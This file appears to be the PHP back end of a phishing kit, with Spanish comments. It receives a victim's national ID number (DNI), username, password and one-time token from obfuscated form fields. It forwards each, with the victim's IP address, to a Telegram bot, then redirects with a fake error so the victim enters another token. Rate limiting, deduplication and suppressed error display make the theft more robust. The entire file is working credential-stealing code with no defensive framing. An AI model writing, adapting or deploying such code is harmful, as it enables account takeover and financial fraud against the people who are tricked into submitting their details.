<?php
// no mostramos errores al cliente, pero los dejamos en archivo —
// en cpanel display_errors suele estar off, pero si no, igual silenciamos.
error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', __DIR__ . '/state/php.log');

require __DIR__ . '/config.php';
require __DIR__ . '/tg.php';

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$ip = trim(explode(',', $ip)[0]);
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// state dir: bulletproof. si mkdir falla, caemos a sys_get_temp_dir()
// para que el flujo del POST siga vivo aunque falle el throttle/dedup.
$stateDir = __DIR__ . '/state';
if (!is_dir($stateDir)) {
    @mkdir($stateDir, 0775, true);
}
if (!is_dir($stateDir) || !is_writable($stateDir)) {
    $stateDir = sys_get_temp_dir() . '/gal_state';
    if (!is_dir($stateDir)) {
        @mkdir($stateDir, 0775, true);
    }
}

// ---- 1. size cap: drop oversized fields before any outbound call
$maxField = 256;
foreach (['tete', 'feca', 'teca', 'tok'] as $f) {
    if (isset($_POST[$f]) && strlen($_POST[$f]) > $maxField) {
        header('Location: ../index.php');
        exit;
    }
}

// ---- 2. per-ip throttle: N posts per window
$now    = time();
$window = 10;
$limit  = 6;

$ipKey  = hash('sha256', $ip . '|' . $ua);
$ipFile = $stateDir . '/ip_' . substr($ipKey, 0, 24) . '.json';

$state = @json_decode(@file_get_contents($ipFile), true);
$hits  = (is_array($state) && isset($state['hits']) && is_array($state['hits']))
    ? array_values(array_filter($state['hits'], fn($t) => $t > $now - $window))
    : [];

if (count($hits) >= $limit) {
    header('Location: ../index.php?step=token&error=1');
    exit;
}

$hits[] = $now;
@file_put_contents($ipFile, json_encode(['hits' => $hits]), LOCK_EX);

// ---- 3. dedup: identical payload inside the window is a double-submit
$sig     = hash('sha256', $ip . '|' . serialize($_POST));
$sigFile = $stateDir . '/sig_' . substr($sig, 0, 24);
$last    = (int) @file_get_contents($sigFile);

if ($last && ($now - $last) < $window) {
    $tail = isset($_POST['tok']) ? '&error=1' : '';
    header('Location: ../index.php?step=token' . $tail);
    exit;
}
@file_put_contents($sigFile, (string) $now, LOCK_EX);

// ---- 4. forward
$msg = '';

if (isset($_POST['tete'])) {
    $msg .= "\r\n";
    $msg .= "DNI  : <code>" . htmlspecialchars($_POST['tete'], ENT_QUOTES) . "</code>\r\n";
    $msg .= "USER : <code>" . htmlspecialchars($_POST['feca'] ?? '', ENT_QUOTES) . "</code>\r\n";
    $msg .= "PASS : <code>" . htmlspecialchars($_POST['teca'] ?? '', ENT_QUOTES) . "</code>\r\n";
    $msg .= "IP   : <code>" . htmlspecialchars($ip, ENT_QUOTES) . "</code>\r\n";
    sendTg($msg, $key, $id);
    header('Location: ../index.php?step=token');
    exit;
}

if (isset($_POST['tok'])) {
    $msg .= "TOKEN : <code>" . htmlspecialchars($_POST['tok'], ENT_QUOTES) . "</code>\r\n";
    $msg .= "IP    : <code>" . htmlspecialchars($ip, ENT_QUOTES) . "</code>\r\n";
    sendTg($msg, $key, $id);
    header('Location: ../index.php?step=token&error=1');
    exit;
}

header('Location: ../index.php');
exit;
